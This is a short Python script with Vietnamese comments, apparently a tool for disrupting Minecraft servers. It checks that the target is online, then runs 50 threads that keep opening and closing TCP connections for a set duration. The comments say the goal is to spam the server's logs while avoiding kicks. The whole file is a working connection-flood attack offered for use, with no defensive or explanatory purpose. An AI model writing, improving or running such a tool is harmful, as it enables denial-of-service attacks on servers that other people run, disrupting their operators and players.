import socket
import time
import threading
import sys
import random

def ping_server(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, int(port)))
        return True
    except Exception:
        return False
    finally:
        s.close()

def spam_join(host, port, bot_name, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, int(port)))
            # Gửi handshake packet (giả lập join server mc)
            # Chỉ mở kết nối rồi ngắt để tạo rác log, tránh bị kick sớm
            time.sleep(random.uniform(0.5, 1.5))
            s.close()
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python mcdrink.py <IP> <PORT> <DURATION>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    duration = int(sys.argv[3])
    
    print(f"[*] Checking {ip}:{port}...")
    if not ping_server(ip, port):
        print("[!] Server offline.")
        sys.exit(1)
        
    print(f"[*] Spamming for {duration}s...")
    threads = []
    for i in range(50): # 50 luồng
        t = threading.Thread(target=spam_join, args=(ip, port, f"bot_{i}", duration))
        t.daemon = True
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
    print("[+] Done.")
